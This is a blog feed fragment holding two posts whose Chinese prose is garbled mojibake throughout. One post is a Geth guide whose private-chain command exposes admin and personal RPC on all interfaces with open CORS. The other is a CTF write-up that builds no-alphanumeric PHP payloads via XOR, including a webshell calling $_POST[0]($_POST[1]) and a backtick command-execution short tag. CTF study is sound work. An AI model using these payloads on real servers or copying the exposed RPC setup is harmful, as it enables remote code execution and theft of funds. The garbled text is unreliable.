        <content type="html"><![CDATA[<h1 id="Gethæ­å»ºå…¬æœ‰èŠ‚ç‚¹"><a href="#Gethæ­å»ºå…¬æœ‰èŠ‚ç‚¹" class="headerlink" title="Gethæ­å»ºå…¬æœ‰èŠ‚ç‚¹"></a>Gethæ­å»ºå…¬æœ‰èŠ‚ç‚¹</h1><p>Gethæ­å»ºå…¬æœ‰èŠ‚ç‚¹ä¸»è¦æ˜¯å› ä¸ºå®éªŒå®¤æœ‰è·å–åŒºå—æ•°æ®è¿™ä¸€éœ€æ±‚ï¼Œå› æ­¤è¿™é‡Œè®°å½•ä¸€ä¸‹å¦‚ä½•å»ºç«‹ä¸€ä¸ªå…¬æœ‰é“¾èŠ‚ç‚¹å¹¶æš´éœ²å…¶json-rpcä¾›å…¶ä»–äººè°ƒç”¨ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">geth --syncmode=light --datadir <span class="string">"./public_chain"</span>  --rpc --rpcaddr <span class="string">"127.0.0.1"</span>  --rpcport <span class="string">"8545"</span></span><br></pre></td></tr></table></figure><a id="more"></a><ul><li><p>â€”syncmode=lightï¼šä»…è·å–å½“å‰çŠ¶æ€ï¼Œéœ€è¦å…¶ä»–ä¿¡æ¯å‘å…¶ä»–fullèŠ‚ç‚¹è¯·æ±‚ï¼ˆå…¶ä»–æ¨¡å¼è¿˜æœ‰ï¼šfullâ€”â€”å…¨èŠ‚ç‚¹æ¨¡å¼ï¼Œä¸‹è½½æ‰€æœ‰åŒºå—header&amp;bodyï¼Œå¹¶ä¸”éªŒè¯ï¼Œfastâ€”â€”å¿«é€Ÿæ¨¡å¼ï¼Œä¸‹è½½æ‰€æœ‰åŒºå—ï¼Œä½†ä¸éªŒè¯ï¼‰</p></li><li><p>â€”datadir â€œ./public_chainâ€ï¼šä¿å­˜æ•°æ®åœ¨â€./public_chainâ€</p></li><li><p>â€”rpc -rpcaddr â€œ127.0.0.1â€  â€”rpcport â€œ8545â€ï¼šå¼€æ”¾127.0.0.1:8545çš„JSON-RPCè®¿é—®</p></li></ul><p>å°è¯•RPCè®¿é—®</p><p>æŸ¥è¯¢ç‰ˆæœ¬ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ curl -H <span class="string">"Content-Type: application/json"</span> -X POST  --data <span class="string">'&#123;"jsonrpc":"2.0","method":"web3_clientVersion","params":[],"id":67&#125;'</span> http://127.0.0.1:8545</span><br><span class="line">&#123;<span class="string">"jsonrpc"</span>:<span class="string">"2.0"</span>,<span class="string">"id"</span>:67,<span class="string">"result"</span>:<span class="string">"Geth/v1.8.13-stable-225171a4/windows-amd64/go1.10.3"</span>&#125;</span><br></pre></td></tr></table></figure><p>æŸ¥è¯¢åŒºå—ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ curl -H <span class="string">"Content-Type: application/json"</span> -X POST  --data <span class="string">'&#123;"jsonrpc":"2.0","method":"eth_syncing","params":[],"id":1&#125;'</span> http://127.0.0.1:8545</span><br><span class="line">&#123;<span class="string">"jsonrpc"</span>:<span class="string">"2.0"</span>,<span class="string">"id"</span>:1,<span class="string">"result"</span>:&#123;<span class="string">"currentBlock"</span>:<span class="string">"0x6a563f"</span>,<span class="string">"highestBlock"</span>:<span class="string">"0x6a9987"</span>,<span class="string">"knownStates"</span>:<span class="string">"0x0"</span>,<span class="string">"pulledStates"</span>:<span class="string">"0x0"</span>,<span class="string">"startingBlock"</span>:<span class="string">"0x687fff"</span>&#125;&#125;</span><br></pre></td></tr></table></figure><p>è¯¦ç»†APIè¯·å‚é˜…<a href="https://github.com/ethereum/wiki/wiki/JSON-RPC#json-rpc-api" target="_blank" rel="noopener">https://github.com/ethereum/wiki/wiki/JSON-RPC#json-rpc-api</a></p><p>å¦‚æœæ²¡æœ‰åŒºå—ä¿¡æ¯éœ€è¦å°†static-nodes.jsonæ”¾åœ¨chain_dataç›®å½•ä¸‹ï¼š</p><p><a href="https://ethfans.org/wikis/%E6%98%9F%E7%81%AB%E8%8A%82%E7%82%B9%E8%AE%A1%E5%88%92%E8%B6%85%E7%BA%A7%E8%8A%82%E7%82%B9%E5%88%97%E8%A1%A8" target="_blank" rel="noopener">https://ethfans.org/wikis/%E6%98%9F%E7%81%AB%E8%8A%82%E7%82%B9%E8%AE%A1%E5%88%92%E8%B6%85%E7%BA%A7%E8%8A%82%E7%82%B9%E5%88%97%E8%A1%A8</a></p><h1 id="Gethæ­å»ºç§æœ‰é“¾"><a href="#Gethæ­å»ºç§æœ‰é“¾" class="headerlink" title="Gethæ­å»ºç§æœ‰é“¾"></a>Gethæ­å»ºç§æœ‰é“¾</h1><p>ç›®å‰ç½‘ä¸Šå†™çš„ç§æœ‰é“¾æ­å»ºçš„æ­¥éª¤å‡æ²¡æœ‰ä»‹ç»å¦‚ä½•åˆå§‹åŒ–è´¦æˆ·åŠåˆå§‹é‡‘é¢çš„é—®é¢˜ï¼Œæœ¬æ–‡è®°å½•ä¸€ä¸‹ä½¿ç”¨Gethæ„é€ ä¸€ä¸ªç§æœ‰é“¾çš„å®Œæ•´æ­¥éª¤ã€‚</p><h2 id="0x01-åˆ›å»ºæ–°è´¦æˆ·"><a href="#0x01-åˆ›å»ºæ–°è´¦æˆ·" class="headerlink" title="0x01 åˆ›å»ºæ–°è´¦æˆ·"></a>0x01 åˆ›å»ºæ–°è´¦æˆ·</h2><p>å¦‚æœéœ€è¦åœ¨ç§æœ‰é“¾ä¸Šåˆå§‹åŒ–ä¸€äº›è´¦æˆ·ä»¥åŠç»™è¿™äº›è´¦æˆ·å‘æ”¾ä¸€å®šæ•°é‡çš„ä»¥å¤ªå¸ï¼Œå°±éœ€è¦æ–°å»ºä¸€äº›è´¦æˆ·ã€‚ä½¿ç”¨<code>account new</code>å‘½ä»¤æ–°å»ºè´¦æˆ·ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ mkdir testchain<span class="comment"># æ–°å»ºä¸€ä¸ªæ–‡ä»¶å¤¹æ”¾ç½®æ•°æ®</span></span><br><span class="line">$ geth --datadir <span class="string">"./testchain"</span> account new<span class="comment"># æ–°å»ºè´¦æˆ·ï¼Œéœ€è¦è®¾ç½®å¯†ç </span></span><br><span class="line">WARN [10-23|20:08:07] No etherbase <span class="built_in">set</span> and no accounts found as default</span><br><span class="line">Your new account is locked with a password. Please give a password. Do not forget this password.</span><br><span class="line">Passphrase:</span><br><span class="line">Repeat passphrase:</span><br><span class="line">Address: &#123;28c67f4a957fcd814effce00863eb3aeb9e9884a&#125;</span><br><span class="line">$ ls ./testchain</span><br><span class="line">keystore</span><br><span class="line">$ ls ./testchain/keystore/<span class="comment"># è´¦æˆ·æ–‡ä»¶</span></span><br><span class="line">UTC--2018-10-23T12-08-15.951611300Z--28c67f4a957fcd814effce00863eb3aeb9e9884a</span><br></pre></td></tr></table></figure><h2 id="0x02-ç¼–å†™é…ç½®æ–‡ä»¶"><a href="#0x02-ç¼–å†™é…ç½®æ–‡ä»¶" class="headerlink" title="0x02 ç¼–å†™é…ç½®æ–‡ä»¶"></a>0x02 ç¼–å†™é…ç½®æ–‡ä»¶</h2><p>åœ¨<code>testchain</code>ç›®å½•ä¸‹æ–°å»º<code>genesis.json</code>æ–‡ä»¶ï¼Œå†…å®¹å¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;config&quot;:&#123;</span><br><span class="line">        &quot;homesteadBlock&quot;:0</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;nonce&quot;: &quot;0x0000000000000042&quot;,</span><br><span class="line">    &quot;timestamp&quot;: &quot;0x0&quot;,</span><br><span class="line">    &quot;parentHash&quot;: &quot;0x0000000000000000000000000000000000000000000000000000000000000000&quot;,</span><br><span class="line">    &quot;extraData&quot;: &quot;0x&quot;,</span><br><span class="line">    &quot;gasLimit&quot;: &quot;0x8000000000000000&quot;,</span><br><span class="line">    &quot;difficulty&quot;: &quot;0x02&quot;,</span><br><span class="line">    &quot;mixhash&quot;: &quot;0x0000000000000000000000000000000000000000000000000000000000000000&quot;,</span><br><span class="line">    &quot;coinbase&quot;: &quot;0x28c67f4a957fcd814effce00863eb3aeb9e9884a&quot;,</span><br><span class="line">    &quot;alloc&quot;: &#123;</span><br><span class="line">        &quot;0x28c67f4a957fcd814effce00863eb3aeb9e9884a&quot;:&#123;&quot;balance&quot;:&quot;2000000000000000000000000&quot;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ï¼Œ<code>coinbase</code>æŒ‡æŒ–çŸ¿çš„æŠ¥é…¬å‘é€åˆ°çš„è´¦æˆ·ï¼Œ<code>alloc</code>æŒ‡åˆå§‹åŒ–è´¦æˆ·åŠå…¶åˆå§‹é‡‘é¢ï¼Œæ³¨æ„è¿™é‡Œçš„åœ°å€éƒ½éœ€è¦æ˜¯æ–°å»ºçš„è´¦æˆ·ï¼›<code>difficulty</code>æŒ‡æŒ–çŸ¿éš¾åº¦ï¼Œ<code>gasLimit</code>æŒ‡ä¸€ä¸ªåŒºå—ä¸­çš„Gasé™åˆ¶ï¼Œå³æ‰“åŒ…åŒºå—æ—¶æ‰€æœ‰çš„äº¤æ˜“GasèŠ±è´¹ä¸å¾—è¶…è¿‡è¯¥å€¼ã€‚</p><h2 id="0x03-ä½¿ç”¨å‘½ä»¤æ„é€ åˆ›å§‹å—"><a href="#0x03-ä½¿ç”¨å‘½ä»¤æ„é€ åˆ›å§‹å—" class="headerlink" title="0x03 ä½¿ç”¨å‘½ä»¤æ„é€ åˆ›å§‹å—"></a>0x03 ä½¿ç”¨å‘½ä»¤æ„é€ åˆ›å§‹å—</h2><p>è‹¥æ–‡ä»¶å¤¹ä¸‹æœ‰æ—§åŒºå—ä¿¡æ¯éœ€è¦å…ˆåˆ é™¤ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">geth --datadir <span class="string">"./testchain"</span> removedb</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨genesis.jsonåˆ›å»ºåˆ›å§‹å—</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">geth --datadir <span class="string">"./testchain"</span> init ./testchain/genesis.json</span><br></pre></td></tr></table></figure><h2 id="0x04-å¯åŠ¨èŠ‚ç‚¹"><a href="#0x04-å¯åŠ¨èŠ‚ç‚¹" class="headerlink" title="0x04 å¯åŠ¨èŠ‚ç‚¹"></a>0x04 å¯åŠ¨èŠ‚ç‚¹</h2><p>åˆ›å§‹å—å®Œæˆåå¯ä»¥ä½¿ç”¨gethå¯åŠ¨èŠ‚ç‚¹å¹¶å¼€å§‹æŒ–çŸ¿äº†ï¼Œå…·ä½“å‘½ä»¤å¦‚ä¸‹ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">geth --syncmode=full  --identity <span class="string">"TestNode0"</span> --rpc -rpcaddr <span class="string">"0.0.0.0"</span>  --rpcport <span class="string">"8545"</span> --rpccorsdomain <span class="string">"*"</span> --port <span class="string">"30303"</span> --nodiscover  --rpcapi <span class="string">"db,eth,net,web3,miner,net,personal,net,txpool,admin,debug"</span>  --networkid 1900   --datadir <span class="string">"./testchain"</span> --nat <span class="string">"any"</span> --mine --minerthreads <span class="string">"1"</span></span><br></pre></td></tr></table></figure><p>å…¶ä¸­ä¸€äº›é‡è¦å‚æ•°çš„å«ä¹‰ä¸ºï¼š</p><ul><li><p>â€”identityï¼šèŠ‚ç‚¹åç§°</p></li><li><p>â€”rpc -rpcaddr â€œ0.0.0.0â€ â€”rpcport â€œ8545â€ï¼šèŠ‚ç‚¹å¼€æ”¾rpcè¿æ¥ï¼Œç›‘å¬åœ°å€ä¸º0.0.0.0:8545</p></li><li><p>â€”rpcapiï¼šrpcæä¾›çš„apiç±»å‹</p></li><li><p>â€”rpccorsdomainï¼šrpcå…è®¸æ¥å…¥æœ¬èŠ‚ç‚¹çš„ç½‘æ®µï¼Œåˆ†å·éš”å¼€</p></li><li><p>â€”portï¼šèŠ‚ç‚¹é—´è”ç³»ä½¿ç”¨çš„ç«¯å£å·</p></li><li><p>â€”networkidï¼šåŒºå—é“¾çš„ç½‘ç»œå·ï¼Œå”¯ä¸€çš„æ ‡è¯†ä¸€æ¡åŒºå—é“¾ï¼Œæ¯”å¦‚è¯´1=ä¸»é“¾, 3=Ropstenæµ‹è¯•é“¾, 4=Rinkebyæµ‹è¯•é“¾</p></li><li>â€”mine â€”minerthreads 1ï¼šå¯åŠ¨æŒ–çŸ¿ï¼Œå¼€æ”¾1ä¸ªçº¿ç¨‹</li></ul><p>å¯åŠ¨èŠ‚ç‚¹åï¼Œä¸€æ¡ç§æœ‰é“¾å°±å¯ä»¥ä½¿ç”¨äº†ï¼Œå³å¯ä»¥è¿æ¥è¯¥èŠ‚ç‚¹å‘å¸ƒæ™ºèƒ½åˆçº¦ï¼Œæˆ–è€…å‘èµ·æ–°çš„äº¤æ˜“ã€‚</p><p>ä¾‹å¦‚ï¼šè¿æ¥èŠ‚ç‚¹ï¼ŒæŸ¥çœ‹è´¦æˆ·</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ geth attach http://localhost:8545</span><br><span class="line">Welcome to the Geth JavaScript console!</span><br><span class="line"></span><br><span class="line">instance: Geth/TestNode0/v1.7.0-unstable/linux-amd64/go1.10.1</span><br><span class="line">coinbase: 0x28c67f4a957fcd814effce00863eb3aeb9e9884a</span><br><span class="line">at block: 13 (Tue, 23 Oct 2018 20:55:04 DST)</span><br><span class="line"> datadir: /home/anemone/testchain</span><br><span class="line"> modules: admin:1.0 debug:1.0 eth:1.0 miner:1.0 net:1.0 personal:1.0 rpc:1.0 txpool:1.0 web3:1.0</span><br><span class="line"></span><br><span class="line">&gt; eth.accounts</span><br><span class="line">[<span class="string">"0x28c67f4a957fcd814effce00863eb3aeb9e9884a"</span>]</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> åŒºå—é“¾ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> åŒºå—é“¾ </tag>
            
            <tag> Geth </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2018å®‰æ’9æœˆèµ›babybypasså¤ç°&amp;æ— å­—æ¯æ•°å­—çš„webshellæ€è€ƒ</title>
      <link href="/ctf-2018%E5%AE%89%E6%81%929%E6%9C%88%E8%B5%9Bbabybypass%E5%A4%8D%E7%8E%B0-%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97%E7%9A%84webshell%E6%80%9D%E8%80%83/"/>
      <url>/ctf-2018%E5%AE%89%E6%81%929%E6%9C%88%E8%B5%9Bbabybypass%E5%A4%8D%E7%8E%B0-%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97%E7%9A%84webshell%E6%80%9D%E8%80%83/</url>
      
        <content type="html"><![CDATA[<p>ä¸€å¼€å§‹çœ‹è¿™é¢˜æ»¡è„‘å­æƒ³çš„éƒ½æ˜¯ç”¨å¼‚æˆ–æ¥åšï¼Œç»“æœå‘ç°æ²¡åŠæ³•è°ƒç”¨getflagå‡½æ•°ï¼Œçœ‹äº†åˆ«äººçš„wpæ‰å‘ç°æ€è·¯é”™äº†ã€‚</p><h1 id="é”™è¯¯æ€è·¯"><a href="#é”™è¯¯æ€è·¯" class="headerlink" title="é”™è¯¯æ€è·¯"></a>é”™è¯¯æ€è·¯</h1><p>æ¯•ç«Ÿè¿™ä¸ªæ€è·¯ä¹Ÿè›®æ¸…å¥‡ï¼Œå¤§æ¦‚è¯´ä¸€ä¸‹å§ï¼š</p><p>æ€è€ƒè¿™ä¸€ä¸ªé¢˜ç›®</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'code'</span>]))&#123;</span><br><span class="line">    $code = $_GET[<span class="string">'code'</span>];</span><br><span class="line">    <span class="keyword">if</span>(strlen($code)&gt;<span class="number">135</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Long."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/[A-Za-z0-9]+/"</span>,$code))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"NO."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">eval</span>($code);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Flag"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><a id="more"></a><p>codeå‚æ•°ç”±æ­£åˆ™è¿‡æ»¤äº†å¤§å°å†™å­—æ¯ä»¥åŠæ•°å­—ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥é€šè¿‡ç¬¦å·å¼‚æˆ–æ„é€ payloadã€‚</p><p>ä»¥ä¸‹è„šæœ¬å¯ä»¥æ‰“å°å‡ºç¬¦å·å¼‚æˆ–å¾—åˆ°çš„å€¼ï¼Œç»è¿‡è¯•éªŒ26ä¸ªå­—æ¯çš„å¤§å°å†™éƒ½å¯ä»¥é€šè¿‡è¿™ç§æ–¹æ³•å¾—åˆ°ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span><span class="params">()</span>:</span></span><br><span class="line">    arr=[chr(i) <span class="keyword">for</span> i <span class="keyword">in</span> range(ord(<span class="string">'a'</span>),ord(<span class="string">'z'</span>))]+[chr(i) <span class="keyword">for</span> i <span class="keyword">in</span> range(ord(<span class="string">'A'</span>),ord(<span class="string">'Z'</span>))]</span><br><span class="line">    test=[<span class="string">'`'</span>,<span class="string">'~'</span>,<span class="string">'!'</span>,<span class="string">'@'</span>,<span class="string">'%'</span>,<span class="string">'^'</span>,<span class="string">'*'</span>,<span class="string">'('</span>,<span class="string">')'</span>,<span class="string">'-'</span>,<span class="string">'+'</span>,<span class="string">'&#123;'</span>,<span class="string">'&#125;'</span>,<span class="string">'['</span>,<span class="string">']'</span>,<span class="string">':'</span>,<span class="string">'&lt;'</span>,<span class="string">'&gt;'</span>,<span class="string">'.'</span>,<span class="string">','</span>,<span class="string">';'</span>,<span class="string">'|'</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> test:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> test:</span><br><span class="line">            res=chr(ord(i)^ord(j))</span><br><span class="line">            <span class="keyword">if</span> res <span class="keyword">in</span> arr:</span><br><span class="line">                <span class="keyword">print</span> i,j,res</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">[ &lt; g</span></span><br><span class="line"><span class="string">[ &gt; e</span></span><br><span class="line"><span class="string">] ) t</span></span><br><span class="line"><span class="string">| : F</span></span><br><span class="line"><span class="string">@ , l</span></span><br><span class="line"><span class="string">[ : a</span></span><br><span class="line"><span class="string">[ &lt; g</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'[[]|@[['^'&lt;&gt;):,:&lt;'</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    xor()</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ° â€˜[â€˜ ^â€™&lt;â€™ =â€™gâ€™, â€˜[â€˜^â€™&gt;â€™=â€™eâ€™, â€¦</p><p>é‚£ä¹ˆä½¿ç”¨<code>&#39;[[]|@[[&#39;^&#39;&lt;&gt;):,:&lt;&#39;</code>å°±å¯ä»¥å¾—åˆ°å­—ç¬¦ä¸²â€™getFlagâ€™ï¼Œä¸‹é¢å°±æ˜¯æ€ä¹ˆè°ƒç”¨ï¼Œæƒ³åˆ° <code>$_=&#39;getFlag&#39;;$_();</code>ç­‰åŒäº<code>getFlag();&#39;</code>, é‚£ä¹ˆä½¿ç”¨<code>$_=&#39;[[]|@[[&#39;^&#39;&lt;&gt;):,:&lt;&#39;;$_();</code>å°±å¯ä»¥è°ƒç”¨äº†ï¼Œé‚£ä¹ˆæœ€åçš„payloadå°±æ˜¯<code>code=$_=&#39;[[]|@[[&#39;^&#39;&lt;&gt;):,:&lt;&#39;;$_();</code></p><p>æŒ‰ç…§æ­¤åŸç†ï¼Œå¯ä»¥æ„é€ å‡ºä¸€å¥è¯æ¯”å¦‚ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    @$_++; <span class="comment">// $_ = 1</span></span><br><span class="line">    $__=(<span class="string">"#"</span>^<span class="string">"|"</span>); <span class="comment">// $__ = _</span></span><br><span class="line">    $__.=(<span class="string">"."</span>^<span class="string">"~"</span>); <span class="comment">// _P</span></span><br><span class="line">    $__.=(<span class="string">"/"</span>^<span class="string">"`"</span>); <span class="comment">// _PO</span></span><br><span class="line">    $__.=(<span class="string">"|"</span>^<span class="string">"/"</span>); <span class="comment">// _POS</span></span><br><span class="line">    $__.=(<span class="string">"&#123;"</span>^<span class="string">"/"</span>); <span class="comment">// _POST </span></span><br><span class="line">    $&#123;$__&#125;[!$_]($&#123;$__&#125;[$_]); <span class="comment">// $_POST[0]($_POST[1]);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h1 id="å›åˆ°é¢˜ç›®"><a href="#å›åˆ°é¢˜ç›®" class="headerlink" title="å›åˆ°é¢˜ç›®"></a>å›åˆ°é¢˜ç›®</h1><p>å†çœ‹ä¸€ä¸‹è¿™é“é¢˜ç›®</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// include 'flag.php';</span></span><br><span class="line"><span class="comment">// $code='[[]|@[['^'&lt;&gt;):,:&lt;';</span></span><br><span class="line"><span class="comment">// echo $code.'()';</span></span><br><span class="line"><span class="comment">// @eval($code);</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'code'</span>]))&#123;</span><br><span class="line">    $code = $_GET[<span class="string">'code'</span>];</span><br><span class="line">    <span class="keyword">if</span>(strlen($code)&gt;<span class="number">35</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Long."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/[A-Za-z0-9_$]+/"</span>,$code))&#123; <span class="comment">//*</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"NO."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">eval</span>($code);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Flag"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//$hint =  "php function getFlag() to get flag";</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>åœ¨æ­£åˆ™è¿‡æ»¤é‚£è¾¹ï¼Œå¯ä»¥çœ‹åˆ°<code>$</code>å’Œ<code>_</code>éƒ½è¢«è¿‡æ»¤äº†ï¼Œè¿™ç›´æ¥å¯¼è‡´äº†å³ä½¿ç”¨ä¸Šè¿°æ–¹æ³•å¾—åˆ°äº†å­—ç¬¦ä¸²ï¼Œä¹Ÿæ²¡åŠæ³•æ‰§è¡Œphpçš„å‡½æ•°ï¼ˆè¿™é‡Œçº æ­£ä¸€ä¸‹ï¼Œphp7ä¸­æˆ‘ä»¬æ˜¯å¯ä»¥é€šè¿‡<code>(&#39;func_name&#39;)()</code>åœ¨æ‰§è¡Œå‡½æ•°çš„ï¼Œè¿™æ ·å…¶å®æˆ‘çš„é”™è¯¯æ€è·¯æ˜¯å¯è¡Œçš„ï¼Œç”šè‡³åœ¨<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html" target="_blank" rel="noopener">æ— å­—æ¯æ•°å­—webshellä¹‹æé«˜ç¯‡</a>ä¸­ï¼Œä½œè€…ç›´æ¥ä½¿ç”¨äº†å–åå­—ç¬¦ä¸²çš„æ–¹æ³•æ„é€ äº†payloadï¼‰ã€‚æ­£ç¡®çš„åšæ³•ä½¿ç”¨phpçŸ­æ ‡ç­¾æ˜¯ç›´æ¥è¯»æ–‡ä»¶ï¼Œè€ƒè™‘å¦‚ä¸‹phpä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>= `ls`<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ‰§è¡Œç»“æœ</p><p><img src="/ctf-2018å®‰æ’9æœˆèµ›babybypasså¤ç°-æ— å­—æ¯æ•°å­—çš„webshellæ€è€ƒ/1538795891202.png" alt="1538795891202"></p><p>å¯ä»¥çœ‹åˆ°ï¼Œ<code>&lt;?= ?&gt;</code>æ˜¯phpçš„çŸ­æ ‡ç­¾ï¼Œæ•ˆæœç­‰åŒäº:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> `ls` <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆåœ¨evalä¸­æ€ä¹ˆç”¨è¿™ä¸ªçŸ­æ ‡ç­¾å‘¢ï¼Ÿç­”æ¡ˆæ˜¯å…ˆä½¿ç”¨tagï¼ˆ<code>?&gt;</code>ï¼‰ç¦»å¼€å½“å‰æ¨¡å¼ï¼Œå†ä½¿ç”¨çŸ­æ ‡ç­¾ï¼Œå³<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span 